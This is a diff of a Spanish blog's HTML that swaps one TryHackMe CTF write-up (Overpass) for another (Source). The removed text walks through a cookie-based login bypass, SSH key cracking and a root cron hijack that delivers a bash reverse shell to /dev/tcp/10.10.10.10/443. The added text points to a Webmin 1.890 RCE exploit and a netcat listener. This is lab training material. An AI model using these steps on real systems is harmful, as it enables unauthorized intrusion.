@@ -1,31 +1,31 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='https://tryhackme.com/room/overpass
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='https://tryhackme.com/room/source
 IP Atacante = 10.10.10.10
-IP Víctima = 10.10.170.40
+IP Víctima = 10.10.16.237
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-1 2 3 4 5 6 7 ❯ ping -c 1 10.10.170.40 PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data. 64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms --- 10.10.170.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 217.'>
-<title>Resolución Overpass</title>
+1 2 3 4 5 6 7 ping -c 1 10.10.16.237 PING 10.10.16.237 (10.10.16.237) 56(84) bytes of data. 64 bytes from 10.10.16.237: icmp_seq=1 ttl=63 time=61.1 ms --- 10.10.16.237 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 61.096/61.096/61.096/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows.'>
+<title>Resolución Source</title>
 
-<link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/'>
+<link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-source/'>
 
-<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Overpass'>
-<meta property='og:description' content='https://tryhackme.com/room/overpass
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Source'>
+<meta property='og:description' content='https://tryhackme.com/room/source
 IP Atacante = 10.10.10.10
-IP Víctima = 10.10.170.40
+IP Víctima = 10.10.16.237
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-1 2 3 4 5 6 7 ❯ ping -c 1 10.10.170.40 PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data. 64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms --- 10.10.170.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 217.'>
-<meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/'>
+1 2 3 4 5 6 7 ping -c 1 10.10.16.237 PING 10.10.16.237 (10.10.16.237) 56(84) bytes of data. 64 bytes from 10.10.16.237: icmp_seq=1 ttl=63 time=61.1 ms --- 10.10.16.237 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 61.096/61.096/61.096/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows.'>
+<meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-source/'>
 <meta property='og:site_name' content='d3b0o'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='crontab' /><meta property='article:published_time' content='2023-01-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-01-07T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/images/portada.png' />
-<meta name="twitter:title" content="Resolución Overpass">
-<meta name="twitter:description" content="https://tryhackme.com/room/overpass
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:published_time' content='2023-01-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-01-19T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/images/portada.png' />
+<meta name="twitter:title" content="Resolución Source">
+<meta name="twitter:description" content="https://tryhackme.com/room/source
 IP Atacante = 10.10.10.10
-IP Víctima = 10.10.170.40
+IP Víctima = 10.10.16.237
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-1 2 3 4 5 6 7 ❯ ping -c 1 10.10.170.40 PING 10.10.170.40 (10.10.170.40) 56(84) bytes of data. 64 bytes from 10.10.170.40: icmp_seq=1 ttl=63 time=218 ms --- 10.10.170.40 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 217."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-overpass/images/portada.png' />
+1 2 3 4 5 6 7 ping -c 1 10.10.16.237 PING 10.10.16.237 (10.10.16.237) 56(84) bytes of data. 64 bytes from 10.10.16.237: icmp_seq=1 ttl=63 time=61.1 ms --- 10.10.16.237 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 61.096/61.096/61.096/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d3b0o.github.io/images/portada.png' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
 <script>
 var doNotTrack = false;
@@ -278,15 +278,10 @@ if (!doNotTrack) {
     <li><a href="#reconocimiento">Reconocimiento</a>
       <ol>
         <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
-        <li><a href="#web">Web</a>
-          <ol>
-            <li><a href="#buscando-subdirectorios">Buscando Subdirectorios</a></li>
-          </ol>
-        </li>
       </ol>
     </li>
-    <li><a href="#infiltración">Infiltración</a></li>
-    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+    <li><a href="#puerto-10000">Puerto 10000</a></li>
+    <li><a href="#intrusión">Intrusión</a></li>
   </ol>
 </nav>
         </div>
@@ -301,13 +296,9 @@ if (!doNotTrack) {
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/resoluci%C3%B3n-overpass/">
-                <img src="/p/resoluci%C3%B3n-overpass/images/portada.png"
-                        
-                        width="1914" 
-                        height="874" 
-                        loading="lazy"
-                        alt="Featured image of post Resolución Overpass" />
+            <a href="/p/resoluci%C3%B3n-source/">
+                
+                    <img src="/images/portada.png" loading="lazy" alt="Featured image of post Resolución Source" />
                 
             </a>
         </div>
@@ -326,7 +317,7 @@ if (!doNotTrack) {
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/resoluci%C3%B3n-overpass/">Resolución Overpass</a>
+            <a href="/p/resoluci%C3%B3n-source/">Resolución Source</a>
         </h2>
     
         
@@ -348,7 +339,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Jan 07, 2023</time>
+                <time class="article-time--published">Jan 19, 2023</time>
             </div>
         
 
@@ -363,7 +354,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    5 minutos a leer
+                    3 minutos a leer
                 </time>
             </div>
         
@@ -378,10 +369,10 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <p><a class="link" href="https://tryhackme.com/room/overpass"  target="_blank" rel="noopener"
-    >https://tryhackme.com/room/overpass</a></p>
+    <p><a class="link" href="https://tryhackme.com/room/source"  target="_blank" rel="noopener"
+    >https://tryhackme.com/room/source</a></p>
 <p>IP Atacante = 10.10.10.10</p>
-<p>IP Víctima = 10.10.170.40</p>
+<p>IP Víctima = 10.10.16.237</p>
 <h2 id="reconocimiento">Reconocimiento</h2>
 <p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
 <div class="highlight"><div class="chroma">
@@ -395,13 +386,13 @@ if (!doNotTrack) {
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ping -c <span class="m">1</span> 10.10.170.40
-</span></span><span class="line"><span class="cl">PING 10.10.170.40 <span class="o">(</span>10.10.170.40<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.170.40: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">218</span> ms
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ping -c <span class="m">1</span> 10.10.16.237
+</span></span><span class="line"><span class="cl">PING 10.10.16.237 <span class="o">(</span>10.10.16.237<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.16.237: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span>61.1 ms
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">--- 10.10.170.40 ping statistics ---
+</span></span><span class="line"><span class="cl">--- 10.10.16.237 ping statistics ---
 </span></span><span class="line"><span class="cl"><span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
-</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 217.508/217.508/217.508/0.000 ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 61.096/61.096/61.096/0.000 ms
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
@@ -412,7 +403,7 @@ if (!doNotTrack) {
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -vvv -Pn 10.10.170.40 -oG allPorts
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -vvv -Pn 10.10.16.237 -oG allPorts
 </span></span></code></pre></td></tr></table>
 </div>
 </div><div class="table-wrapper"><table>
@@ -481,8 +472,8 @@ if (!doNotTrack) {
 </span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ 
 </span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ <span class="o">[</span>*<span class="o">]</span> Extracting information...
 </span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ 
-</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │     <span class="o">[</span>*<span class="o">]</span> IP Address: 10.10.170.40
-</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │     <span class="o">[</span>*<span class="o">]</span> Open ports: 22,80
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │     <span class="o">[</span>*<span class="o">]</span> IP Address: 10.10.186.98
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │     <span class="o">[</span>*<span class="o">]</span> Open ports: 22,10000
 </span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ 
 </span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ <span class="o">[</span>*<span class="o">]</span> Ports copied to clipboard
 </span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ 
@@ -503,291 +494,36 @@ if (!doNotTrack) {
 </span><span class="lnt"> 9
 </span><span class="lnt">10
 </span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nmap -p 22,80 -sC -sV 10.10.170.40
-</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-07 20:15 CET
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.170.40
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.052s latency<span class="o">)</span>.
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nsmap -p22,10000 -sC -sV 10.10.16.237
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 37968598d1009c1463d9b03475b1f957 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5375fac065daddb1e8dd40b8f6823924 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 1c4ada1f36546da6c61700272e67759c <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    Golang net/http server <span class="o">(</span>Go-IPFS json-rpc or InfluxDB API<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Overpass
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> b74cd0bde27b1b15722764562915ea23 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b78523114f44fa22008e40775ecf287c <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a9fe4b82bf893459365becdac2d395ce <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">10000/tcp open  http    MiniServ 1.890 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="web">Web</h3>
-<p>Con el whatweb podemos ver más información sobre la web:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ whatweb 10.10.170.40
-</span></span><span class="line"><span class="cl">http://10.10.170.40 <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTML5, IP<span class="o">[</span>10.10.170.40<span class="o">]</span>, Script, Title<span class="o">[</span>Overpass<span class="o">]</span>, X-UA-Compatible<span class="o">[</span><span class="nv">IE</span><span class="o">=</span>edge<span class="o">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Al entrar a la web con lo primero que nos encontramos es esta página</p>
-<p><img src="/p/resoluci%C3%B3n-overpass/images/web.png"
-	width="1891"
-	height="605"
-	
-	loading="lazy"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="312"
-		data-flex-basis="750px"
-	
-></p>
-<h4 id="buscando-subdirectorios">Buscando Subdirectorios</h4>
-<p>Con wfuzz vamos a buscar subdirectorios mediante el diccionario <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
-</span></span><span class="line"><span class="cl">ID           Response   Lines    Word       Chars       <span class="nv">Payload</span>                                                                                                                     
-</span></span><span class="line"><span class="cl"><span class="o">=====================================================================</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">000000069:   <span class="m">301</span>        <span class="m">0</span> L      <span class="m">0</span> W        <span class="m">0</span> Ch        <span class="s2">&#34;downloads&#34;</span>                                                                                                                 
-</span></span><span class="line"><span class="cl">000000039:   <span class="m">301</span>        <span class="m">0</span> L      <span class="m">0</span> W        <span class="m">0</span> Ch        <span class="s2">&#34;img&#34;</span>                                                                                                                       
-</span></span><span class="line"><span class="cl">000000156:   <span class="m">301</span>        <span class="m">0</span> L      <span class="m">0</span> W        <span class="m">0</span> Ch        <span class="s2">&#34;aboutus&#34;</span>                                                                                                                   
-</span></span><span class="line"><span class="cl">000000259:   <span class="m">301</span>        <span class="m">2</span> L      <span class="m">3</span> W        <span class="m">42</span> Ch       <span class="s2">&#34;admin&#34;</span>                                                                                                                     
-</span></span><span class="line"><span class="cl">000000550:   <span class="m">301</span>        <span class="m">0</span> L      <span class="m">0</span> W        <span class="m">0</span> Ch        <span class="s2">&#34;css&#34;</span> 
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="infiltración">Infiltración</h2>
-<p>Dentro del /admin hay un panel de login. Viendo el codigó del /admin se puede ver que hay un login.js</p>
+</div><h2 id="puerto-10000">Puerto 10000</h2>
+<p>El nmap ha reportado la versión del puerto 10000 (Webmin 1.890) la cual con una búsqueda rápida por google podemos ver que es vulnerable. He encontrado en github un exploit: <a class="link" href="https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE"  target="_blank" rel="noopener"
+    >https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE</a>, al ejecutarlo podemos ejecutar comandos como root en el servidor, pero necesitamos pasarlos por un url encoder antes de mandarlos.</p>
+<h2 id="intrusión">Intrusión</h2>
+<p>Como podemos ejecutar comandos como root en el servidor podemos ya directamente ver las 2 flags o mandarnos una reverse shell.</p>
+<p>Nos ponemos en escucha por el puerto 443</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/login.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">443</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>El cual contiene lo siguiente:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">async function postData(url = &#39;&#39;, data = {}) {
-</span></span><span class="line"><span class="cl">    // Default options are marked with *
-</span></span><span class="line"><span class="cl">    const response = await fetch(url, {
-</span></span><span class="line"><span class="cl">        method: &#39;POST&#39;, // *GET, POST, PUT, DELETE, etc.
-</span></span><span class="line"><span class="cl">        cache: &#39;no-cache&#39;, // *default, no-cache, reload, force-cache, only-if-cached
-</span></span><span class="line"><span class="cl">        credentials: &#39;same-origin&#39;, // include, *same-origin, omit
-</span></span><span class="line"><span class="cl">        headers: {
-</span></span><span class="line"><span class="cl">            &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;
-</span></span><span class="line"><span class="cl">        },
-</span></span><span class="line"><span class="cl">        redirect: &#39;follow&#39;, // manual, *follow, error
-</span></span><span class="line"><span class="cl">        referrerPolicy: &#39;no-referrer&#39;, // no-referrer, *client
-</span></span><span class="line"><span class="cl">        body: encodeFormData(data) // body data type must match &#34;Content-Type&#34; header
-</span></span><span class="line"><span class="cl">    });
-</span></span><span class="line"><span class="cl">    return response; // We don&#39;t always want JSON back
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">const encodeFormData = (data) =&gt; {
-</span></span><span class="line"><span class="cl">    return Object.keys(data)
-</span></span><span class="line"><span class="cl">        .map(key =&gt; encodeURIComponent(key) + &#39;=&#39; + encodeURIComponent(data[key]))
-</span></span><span class="line"><span class="cl">        .join(&#39;&amp;&#39;);
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">function onLoad() {
-</span></span><span class="line"><span class="cl">    document.querySelector(&#34;#loginForm&#34;).addEventListener(&#34;submit&#34;, function (event) {
-</span></span><span class="line"><span class="cl">        //on pressing enter
-</span></span><span class="line"><span class="cl">        event.preventDefault()
-</span></span><span class="line"><span class="cl">        login()
-</span></span><span class="line"><span class="cl">    });
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">async function login() {
-</span></span><span class="line"><span class="cl">    const usernameBox = document.querySelector(&#34;#username&#34;);
-</span></span><span class="line"><span class="cl">    const passwordBox = document.querySelector(&#34;#password&#34;);
-</span></span><span class="line"><span class="cl">    const loginStatus = document.querySelector(&#34;#loginStatus&#34;);
-</span></span><span class="line"><span class="cl">    loginStatus.textContent = &#34;&#34;
-</span></span><span class="line"><span class="cl">    const creds = { username: usernameBox.value, password: passwordBox.value }
-</span></span><span class="line"><span class="cl">    const response = await postData(&#34;/api/login&#34;, creds)
-</span></span><span class="line"><span class="cl">    const statusOrCookie = await response.text()
-</span></span><span class="line"><span class="cl">    if (statusOrCookie === &#34;Incorrect credentials&#34;) {
-</span></span><span class="line"><span class="cl">        loginStatus.textContent = &#34;Incorrect Credentials&#34;
-</span></span><span class="line"><span class="cl">        passwordBox.value=&#34;&#34;
-</span></span><span class="line"><span class="cl">    } else {
-</span></span><span class="line"><span class="cl">        Cookies.set(&#34;SessionToken&#34;,statusOrCookie)
-</span></span><span class="line"><span class="cl">        window.location = &#34;/admin&#34;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Lo que hace es: Se verifica la respuesta del servidor para comprobar si contiene la cadena &ldquo;Incorrect credentials&rdquo; (credenciales incorrectas), y si no se recibe, el script establece una cookie llamada &ldquo;SessionToken&rdquo; con el valor de la respuesta del servidor y redirige al usuario a la página &ldquo;/admin&rdquo;.</p>
-<p>Entonces lo que podemos hacer es crear una cookie con el nombre &ldquo;SessionToken&rdquo; y el value random. Al recargar ya podemos entrar</p>
-<p><img src="/p/resoluci%C3%B3n-overpass/images/cookie2.png"
-	width="898"
-	height="407"
-	
-	loading="lazy"
-	
-	
-		class="gallery-image" 
-		data-flex-grow="220"
-		data-flex-basis="529px"
-	
-></p>
-<p>Lo que vemos al recargar la página, es una RSA private key.</p>
-<p>Esa private key la vamos a guardar en un archivo llamado <strong>id_rsa</strong></p>
-<p>Primero le damos los permisos:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod 600 id_rsa
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>En la rsa private key vemos que pone que està encriptada.</p>
-<p>Para conesguir la contraseña vamos a sacar el hash con ssh2john y después con john mediante un diccionario vamos a probar de crackearlo</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh2john id_rsa &gt; hash.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt id_rsa.hash
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Ya tenemos la contraseña</p>
-<p>Ahora nos conectamos por ssh como james con la id_rsa</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i id_rsa james@10.10.45.54
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
-<p>Con un <code>cat /etc/crontab</code></p>
-<p>Vemos que hace como root un curl a <strong>overpass.thm/downloads/src/buildscript.sh</strong> y después lo ejecuta con bash.</p>
-<p>Tenemos permisos para editar el <strong>/etc/hosts</strong></p>
-<p>Añadimos lo siguiente en el /etc/hosts</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.10.10.10 overpass.thm
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Después desde nuestra máquina creamos las carpetas y el archivo que salen en la url del crontab</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ cat downloads/src/buildscript.sh
-</span></span><span class="line"><span class="cl">───────┬─────────────────────────────────────────────────────────────────────────────────────────
-</span></span><span class="line"><span class="cl">       │ File: downloads/src/buildscript.sh
-</span></span><span class="line"><span class="cl">───────┼─────────────────────────────────────────────────────────────────────────────────────────
-</span></span><span class="line"><span class="cl">   1   │ #!/bin/bash
-</span></span><span class="line"><span class="cl">   2   │ 
-</span></span><span class="line"><span class="cl">   3   │ bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#34;
-</span></span><span class="line"><span class="cl">───────┴─────────────────────────────────────────────────────────────────────────────────────────
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Nos abrimos un servidor con python</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo python3 -m http.server 80
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Y por último nos ponemos en escucha por el puerto 443 con netcat</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
